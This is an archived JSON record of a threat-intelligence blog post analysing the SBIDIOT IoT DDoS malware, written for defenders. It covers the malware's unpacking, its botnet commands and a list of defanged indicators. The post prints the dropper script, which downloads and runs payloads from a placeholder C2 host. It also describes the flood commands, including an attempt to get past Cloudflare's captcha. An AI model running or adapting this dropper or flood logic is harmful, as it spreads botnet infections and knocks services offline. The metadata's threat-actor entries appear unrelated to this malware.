{
    "id": "fc385c88-90e9-4fd6-8e5c-2cac3531f2e6",
    "created_at": "2023-01-12T15:05:50.786772Z",
    "updated_at": "2025-03-27T02:05:52.225536Z",
    "deleted_at": null,
    "sha1_hash": "ab61937109a6e001bf71ed52b51310cf0fc8ad2d",
    "title": "2021-04-07 - Threat Intelligence- Analysis of the SBIDIOT IoT Malware",
    "authors": "",
    "file_creation_date": "2022-05-28T04:59:45Z",
    "file_modification_date": "2022-05-28T04:59:45Z",
    "file_size": 7708213,
    "plain_text": "# Threat Intelligence: Analysis of the SBIDIOT IoT Malware\n\n**[nozominetworks.com/blog/threat-intelligence-analysis-of-the-sbidiot-iot-malware/](https://www.nozominetworks.com/blog/threat-intelligence-analysis-of-the-sbidiot-iot-malware/)**\n\nBy April 7, 2021\n\nThere are billions of IoT connections in the world and more than 70 percent of them are in\nthe industrial sector. This is why Nozomi Networks Labs regularly reviews the threat\nlandscape for IoT devices. Recently, a malware sample named SBIDIOT caught our\nattention. It had a relatively low number of detections on VirusTotal and its commands, in the\ncurrent form, were not well documented by the cybersecurity community.\n\nWe decided to analyze SBIDIOT and uncovered how it communicates with targets and what\ntypes of commands it supports. This information helps detect the threat and allows defenders\nto stop or mitigate it before harmful impacts occur. The main potential impact of DDoS\n(Distributed Denial of Service) botnets is the generation of excessively high loads on\ntargeted servers, preventing users from accessing services and thus harming normal\nbusiness operations.\n\nTo avoid impacts, early detection is vital. Detection can be done by your security team (see\nthe malware indicators at the end of this article) or by using a network monitoring and threat\nintelligence solution such as ours.\n\n\n-----\n\nThere are more than 60 billion IoT devices in use by the industrial sector and many of them\n[have little to no security. It’s therefore important to use threat intelligence to detect and](https://www.nozominetworks.com/products/threat-intelligence/)\nmitigate IoT threats.\n\n## Analysis of SBIDIOT Malware\n\nBased on our information, at least one way that the malware propagates is by exploiting an\nRCE vulnerability in ZTE routers. For older versions, we observed a shell script sh\ndownloading and executing binary payloads once delivered to the victim machines by\nvarious means:\n```\n#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://<cnc_ip>/SBIDIOT/x86; curl -O http://<cnc_ip>/SBIDIOT/x86;cat x86\n>SSH;chmod +x *;./SSH SSH\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://<cnc_ip>/SBIDIOT/mips; curl -O http://<cnc_ip>/SBIDIOT/mips;cat mips\n>SSH;chmod +x *;./SSH SSH\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://<cnc_ip>/SBIDIOT/mpsl; curl -O http://<cnc_ip>/SBIDIOT/mpsl;cat mpsl\n>SSH;chmod +x *;./SSH SSH\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget\nhttp://<cnc_ip>/SBIDIOT/arm; curl -O http://<cnc_ip>/SBIDIOT/arm;cat arm\n>SSH;chmod +x *;./SSH SSH\n...\n\n```\nThe sample `e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9`\nis packed with the standard UPX tool, with the UPX header later modified. While the malware\nremains executable, it is no longer possible to unpack it using the same tool straight away:\n```\n$ file e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\ne2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9: ELF 32-bit\nLSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, no\nsection header\n$ upx -d e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2020\nUPX 3.96 Markus Oberhumer, Laszlo Molnar & John Reiser Jan 23rd 2020\n\n```\n```\nFile size Ratio Format Name\n\n```\n```\n--------- ------ ----- ---upx: e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9:\nNotPackedException: not packed by UPX\nUnpacked 0 files.\n\n```\n\n-----\n\nAs we can see here, the `UPX! signature was replaced with a custom` `YTS\\x99 signature:`\n\nHex dump showing that the “UPX!” string has been replaced.\nRestoring it back will enable us to unpack the sample using the standard UPX tool:\n```\n$ perl -pi -e 's/YTS\\x99/UPX!/g'\ne2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\n$ upx -d e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\nUltimate Packer for eXecutables\nCopyright (C) 1996 - 2020\nUPX 3.96 Markus Oberhumer, Laszlo Molnar & John Reiser Jan 23rd 2020\n\n```\n```\nFile size Ratio Format Name\n\n```\n```\n--------- ------ ----- ---55372 <- 30024 54.22% linux/i386\ne2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\nUnpacked 1 file.\n$ file e2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\ne2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9: ELF 32-bit\nLSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped\n\n```\n\n-----\n\nThe analysis reveals characteristics quite common for this type of threat. There is a strong\nfocus on DDoS with some parts of the code shared with other malware families like Gafgyt.\nGiven that the sample is statically linked and stripped, which is almost always the case with\nmalware targeting IoT, the next step was to load FLIRT signatures for uClibc to make\nanalysis easier. uClibc is a compact C library commonly used in Linux kernel-based\nembedded devices, which is also commonly used by IoT malware developers for easy crosscompilation, as popularized with Mirai. FLIRT signatures are essentially a method that\nreverse engineering tools like IDA use to pattern-match known libraries, which can greatly\nspeed up the analysis process.\n\n\n-----\n\nA large number of functions are recognized using FLIRT.\nUpon execution, the sample attempts to connect to its C2, which in this case is an IP\naddress and port hard-coded into the binary. Although the C2 infrastructure was not\noperational during the time of the investigation, we were able to force the sample to talk to\nour own server as its C2. Coupled with some static analysis, this was enough to quickly\nfigure out the protocol and begin interaction.\nThe function responsible for handling commands compares each command received from\nC2 with one of the following strings:\n\nTCP\nHTTPSTOMP\nVSE\nHEX\nSTD\nVOX\nNFO\nUDP\nUDPH\nR6\nFN\nOVHKILL\nNFOKILL\nSTOP\nStop\nstop\n\nThen, based on the results, it performs several validation checks on its arguments before\nexecuting the actual command.\n\n## Commands Supported by SBIDIOT\n\n**TCP**\n\n\n-----\n\nThe TCP command asks the bot to send TCP segments destined for a specified host/port\ncombination for a specified interval of time. Additionally, it allows the operator to set a\nnumber of optional TCP flags.\n\nCustom TCP flags supported in the TCP command handler.\n**HTTPSTOMP**\nAs arguments, it takes in an HTTP method, a host/port combination, an attack duration and a\nrequest count specifying how many times to repeat this operation. If the attack duration and\nthe request count are not exceeded, this function will continue to perform HTTP requests\nusing the settings provided and a randomly selected user-agent string.\n\n\n-----\n\nHard-coded list of user-agent strings.\n\nHTTPSTOMP command handler.\nAdditionally, another function is called to perform HTTP requests to the /cdncgi/l/chk_captcha URI of a hostname/port combo with, once again, a configurable attack\nduration and request count. This is done in an attempt to circumvent CloudFlare protection\nmechanisms.\n**VSE**\n\n\n-----\n\nAnother command used for DDoS, which, depending on the arguments provided, employs\neither UDP or RAW sockets. Again, arguments for the target and attack duration can be\nprovided, but additionally, the attacker can specify a pause interval between packets\ndelivered to the target. Variants of Gafgyt and other IoT malware occasionally include a VSE\ncommand to target servers running the Valve Source Engine.\n\nCode snippet from VSE command handler implementing pause interval.\n**VOX**\nThe VOX command takes a host, a port and an attack duration as its arguments and then\nsends UDP datagrams with one of three randomly selected hard-coded payloads.\n\n\n-----\n\nRecorded malicious UDP traffic containing hardcoded payloads.\n**UDP**\nThe sample sends UDP payloads to a target host specifying the port, the attack duration and\nthe maximum size of the generated payload. The actual size of the payload may be smaller\ndue to the use of the `strlen function, which calculates the size by counting bytes up until`\nthe first null value.\n\n\n-----\n\nCommand handler validating UDP arguments.\n**HEX / STD / R6 / NFO / FN / OVHKILL / NFOKILL / UDPH**\nAll of the above commands call the same function, which receives a host name, a port and\nan attack duration, then starts generating UDP traffic with a fixed payload.\n\nCode diagram with several code blocks pointing to the same function.\n**STOP/stop/Stop**\nThis command sends a SIGKILL signal to all process IDs that are currently being tracked,\ngiving the operator the ability to stop any of the process’ children.\n\n\n-----\n\nSTOP command handler.\n\n## Threat Intelligence is Needed to Defend Industrial Systems from IoT Malware\n\nAs the number of Internet-connected devices increases at a rate of more than 130 percent a\nyear, the threat landscape also rapidly evolves. New families of malware and modifications1\nof existing ones emerge regularly. And, regardless of their complexity and sophistication,\nthey all pose a threat.\n\nTo defend against threats to IoT devices that could impact production, uptime and possibly\n[safety, automated tools can help. OT/IoT network monitoring paired with regularly updated](https://www.nozominetworks.com/products/vantage/)\n[threat intelligence identifies indicators of compromise and anomalous behavior, giving you](https://www.nozominetworks.com/products/threat-intelligence/)\nthe opportunity to act before harm occurs.\n\nNozomi Networks Labs is committed to providing real-time information on IoT threats as they\ncontinue to increase in prevalence and significance for operational technology environments\n– stay-tuned for ongoing updates.\n\n_For indicators of SBIDIOT malware, see the information provided at the end of this page._\n\n**References**\n\n[1. “The Internet of Things: Consumer, Industrial & Public Services 2020-2024,” Juniper](https://www.juniperresearch.com/researchstore/devices-technology/internet-of-things-iot-data-research-report/subscription/consumer-industrial-public-services)\n\nNetworks, March 31, 2020.\n\n**Related Content**\n\n\n-----\n\nRESEARCH REPORT\n\n## OT/IoT Security Report\n\n**What You Need to Know to Fight Ransomware and IoT Vulnerabilities**\n\n**July 2021**\n\nWhy ransomware is a formidable threat\nAnalysis of DarkSide, the malware that attacked Colonial Pipeline\nLatest ICS and medical device vulnerability trends\nWhy P2P security camera architecture threatens confidentiality\nHow security cameras are vulnerable\nTen measures to take immediately to defend your systems\n\n[Download](https://www.nozominetworks.com/ot-iot-security-report/)\n**Related Links**\n\nBlog: [Defending Against IoT Security Camera Hacks Like Verkada](https://www.nozominetworks.com/blog/defending-against-iot-security-camera-hacks-like-verkada/https:/www.nozominetworks.com/blog/defending-against-iot-security-camera-hacks-like-verkada/)\nBlog: [New Reolink P2P Vulnerabilities Show IoT Security Camera Risks](https://www.nozominetworks.com/blog/new-reolink-p2p-vulnerabilities-show-iot-security-camera-risks/)\nExecutive Brief: [Closing IoT Security Gaps in Your Operation](https://info.nozominetworks.com/executive-brief-closing-iot-security-gaps-in-your-operations-lp-1)\n\n**SBIDIOT Malware Indicators**\n**IOCs**\n\n23.94.136[.]170:61930\nhxxp://23 94 136[ ]170/SBIDIOT/x86\n\n\n-----\n\ne2b3ca0a97107fa351e39111c80b3fefd8cf178864fe82244d41eabe845af4b9\n\nSame as for most modern IoT malware families, there are multiple other URLs associated\nwith the same C&C delivering payloads compiled for other architectures:\n\nhxxp://23.94.136[.]170/SBIDIOT/arm\nhxxp://23.94.136[.]170/SBIDIOT/arm6\nhxxp://23.94.136[.]170/SBIDIOT/arm7\nhxxp://23.94.136[.]170/SBIDIOT/mips\nhxxp://23.94.136[.]170/SBIDIOT/mpsl\nhxxp://23.94.136[.]170/SBIDIOT/ppc\n647b71f683db54bc56873629973f56ac3b8ada33cf9e14706b5efe4d62f2f88f\nb8b654b59e7f1de3107ff5e1c2a538f40f7dea6c63f25db26cf900d19218cccb\n95bb118ecd3c724d6f8110ff7f1a90bac8b4067924f573bcbb17cd59a9ddb348\n7a050fc54ab4dcfbd529a0a7e0b8b6bca9bc619ef7b332bfdc7667b8b7062e6c\nee3e341a0951d1e6f201665240f235eea56f9047d3a2664c53aeccd664057290\nca9bb8898d725ca1faf91d0973628a531f98a3d9dd35dd36ff9c8e621520a656\n\nOther C&C IP addresses seen in 2021:\n\n104.168.98[.]159\n107.172.193[.]132\n107.175.33[.]48\n128.199.40[.]136\n128.199.41[.]8\n128.199.7[.]31\n13.127.49[.]124\n134.209.79[.]179\n135.181.24[.]235\n159.65.204[.]13\n163.172.234[.]205\n163.172.234[.]212\n167.114.27[.]123\n172.245.52[.]102\n176.31.11[.]9\n185.245.96[.]199\n192.227.137[.]42\n194.87.139[.]206\n198.23.229[.]170\n23.94.92[.]200\n37.46.150[.]150\n37 49 229[ ]154\n\n\n-----\n\n37.49.229[.]191\n45.130.138[.]70\n45.148.120[.]88\n45.33.112[.]19\n5.188.0[.]80\n51.116.180[.]169\n51.75.190[.]159\n51.75.191[.]234\n52.152.130[.]178\n85.204.116[.]43\n\nOther commonly used filenames:\n\nsh (located in the root directory rather than in the SBIDIOT subdirectory like the rest of\nthe samples)\nsh4\nspc\nroot\nrtk\nzte\nyarn\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-07 - Threat Intelligence- Analysis of the SBIDIOT IoT Malware.pdf"
    ],
    "report_names": [
        "2021-04-07 - Threat Intelligence- Analysis of the SBIDIOT IoT Malware.pdf"
    ],
    "threat_actors": [
        {
            "id": "caf95a6f-2705-4293-9ee1-6b7ed9d9eb4c",
            "created_at": "2022-10-25T15:50:23.472432Z",
            "updated_at": "2025-03-27T02:00:55.479021Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [
                "Confucius",
                "Confucius APT"
            ],
            "source_name": "MITRE:Confucius",
            "tools": [
                "WarzoneRAT"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "7a8dbc5e-51a8-437a-8540-7dcb1cc110b8",
            "created_at": "2022-10-25T16:07:23.482856Z",
            "updated_at": "2025-03-27T02:02:09.827887Z",
            "deleted_at": null,
            "main_name": "Confucius",
            "aliases": [],
            "source_name": "ETDA:Confucius",
            "tools": [
                "ApacheStealer",
                "ByeByeShell",
                "ChatSpy",
                "Confucius",
                "MY24",
                "Sneepy",
                "remote-access-c3",
                "sctrls",
                "sip_telephone",
                "swissknife2"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535950,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1653713985,
    "ts_modification_date": 1653713985,
    "files": {
        "pdf": "https://archive.orkl.eu/ab61937109a6e001bf71ed52b51310cf0fc8ad2d.pdf",
        "text": "https://archive.orkl.eu/ab61937109a6e001bf71ed52b51310cf0fc8ad2d.txt",
        "img": "https://archive.orkl.eu/ab61937109a6e001bf71ed52b51310cf0fc8ad2d.jpg"
    }
}